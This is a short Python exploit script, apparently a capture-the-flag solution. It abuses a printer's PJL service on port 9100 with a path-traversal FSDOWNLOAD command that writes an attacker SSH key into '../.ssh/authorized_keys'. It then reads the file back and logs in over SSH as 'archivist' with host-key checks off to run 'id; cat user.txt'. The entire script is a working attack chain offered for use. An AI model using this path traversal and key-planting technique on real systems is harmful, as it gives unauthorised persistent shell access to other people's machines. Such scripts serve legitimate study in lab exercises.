#!/usr/bin/env python3
"""Paperwork — write SSH key per jetdirect.py: FSDOWNLOAD NAME=... SIZE=n + body."""
import socket
import subprocess

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
PATH = "../.ssh/authorized_keys"
N = len(KEY)


def pjl(cmd: bytes, body: bytes = b"", timeout: float = 15) -> bytes:
    s = socket.socket()
    s.settimeout(timeout)
    s.connect(("127.0.0.1", 9100))
    s.sendall(cmd + body)
    try:
        return s.recv(4096)
    except socket.timeout:
        return b""
    finally:
        s.close()


# FSDOWNLOAD = write (handle_download)
hdr = f'@PJL FSDOWNLOAD NAME="{PATH}" SIZE={N}\r\n'.encode()
print("write", repr(pjl(hdr, KEY)))

# verify read (FSUPLOAD)
s = socket.socket()
s.settimeout(10)
s.connect(("127.0.0.1", 9100))
s.sendall(f'@PJL FSUPLOAD NAME="{PATH}"\r\n'.encode())
r = s.recv(4096)
s.close()
print("readback", len(r), KEY.strip() in r)

cp = subprocess.run(
    [
        "ssh",
        "-o",
        "BatchMode=yes",
        "-o",
        "StrictHostKeyChecking=no",
        "-o",
        "UserKnownHostsFile=/dev/null",
        "-i",
        "/tmp/id_ed25519",
        "archivist@127.0.0.1",
        "id; cat user.txt",
    ],
    capture_output=True,
    text=True,
    timeout=15,
)
print("ssh_local", cp.returncode, cp.stdout, cp.stderr[:200])